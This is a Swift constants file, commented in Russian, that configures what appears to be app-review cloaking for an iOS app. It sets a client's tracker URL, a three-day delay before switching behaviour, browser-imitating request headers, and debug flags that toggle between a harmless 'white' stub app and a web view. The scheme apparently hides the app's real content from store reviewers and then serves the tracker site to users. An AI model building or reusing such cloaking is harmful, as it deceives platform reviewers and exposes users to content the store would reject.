import Foundation

struct CloakingConstants {
    // URL трекера от заказчика
    static let trackerURL = "https://zhenazanag.pro/7L7RRMSF"
    
    // Настройки времени
    static let initialDelayDays = 3
    static let requestTimeoutSeconds: TimeInterval = 10.0
    static let maxLoadingTimeSeconds: TimeInterval = 15.0
    
    // Ключи для UserDefaults
    static let firstLaunchDateKey = "first_launch_date"
    static let lastCheckDateKey = "last_check_date"
    
    // HTTP заголовки для имитации реального браузера
    static let userAgent = "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1"
    static let acceptHeader = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    static let acceptLanguageHeader = "ru-RU,ru;q=0.9,en;q=0.8"
    
    // MARK: - Debug и Testing настройки
    #if DEBUG
    static var isTestMode = true     // Включить тестовый режим
    static var forceWebView = false  // Принудительно показывать веб-вью для тестирования
    static var forceStubApp = false  // Принудительно показывать белую часть
    static var mockDelayDays = 4     // Пропускаем задержку (4 дня > 3)
    static var skipLoadingDelay = true // Убираем задержку загрузки
    #endif
} 